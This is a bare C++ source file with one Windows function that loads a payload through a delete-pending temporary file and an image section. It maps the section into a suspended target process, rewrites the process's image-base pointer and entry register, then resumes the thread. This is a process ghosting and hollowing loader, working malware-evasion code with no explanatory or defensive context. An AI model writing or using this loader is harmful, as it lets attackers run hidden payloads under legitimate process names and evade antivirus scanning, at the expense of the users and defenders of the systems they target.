#include <windows.h>
#include <winternl.h>

extern "C" NTSTATUS NTAPI NtCreateSection(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
extern "C" NTSTATUS NTAPI NtMapViewOfSection(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
extern "C" NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);

bool launch_image(const wchar_t *target, const wchar_t *temporary_path,
                  const unsigned char *payload, DWORD size, DWORD entry_rva) {
    HANDLE file = CreateFileW(temporary_path, GENERIC_READ | GENERIC_WRITE | DELETE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, nullptr);
    if (file == INVALID_HANDLE_VALUE) return false;
    IO_STATUS_BLOCK ios = {};
    FILE_DISPOSITION_INFORMATION disposition = {};
    disposition.DeleteFile = TRUE;
    if (NtSetInformationFile(file, &ios, &disposition, sizeof(disposition), FileDispositionInformation) < 0) return false;
    DWORD written = 0;
    if (!WriteFile(file, payload, size, &written, nullptr) || written != size) return false;
    HANDLE section = nullptr;
    if (NtCreateSection(&section, SECTION_ALL_ACCESS, nullptr, nullptr,
        PAGE_READONLY, SEC_IMAGE, file) < 0) return false;
    CloseHandle(file);
    STARTUPINFOW startup = {}; startup.cb = sizeof(startup);
    PROCESS_INFORMATION child = {};
    if (!CreateProcessW(target, nullptr, nullptr, nullptr, FALSE,
        CREATE_SUSPENDED, nullptr, nullptr, &startup, &child)) return false;
    void *remote_base = nullptr;
    SIZE_T view_size = 0;
    if (NtMapViewOfSection(section, child.hProcess, &remote_base, 0, 0,
        nullptr, &view_size, 2, 0, PAGE_READONLY) < 0) return false;
    CONTEXT context = {}; context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(child.hThread, &context)) return false;
    SIZE_T changed = 0;
    if (!WriteProcessMemory(child.hProcess, reinterpret_cast<void *>(context.Rdx + 0x10),
        &remote_base, sizeof(remote_base), &changed)) return false;
    context.Rcx = reinterpret_cast<DWORD64>(remote_base) + entry_rva;
    if (NtSetContextThread(child.hThread, &context) < 0) return false;
    return ResumeThread(child.hThread) != static_cast<DWORD>(-1);
}
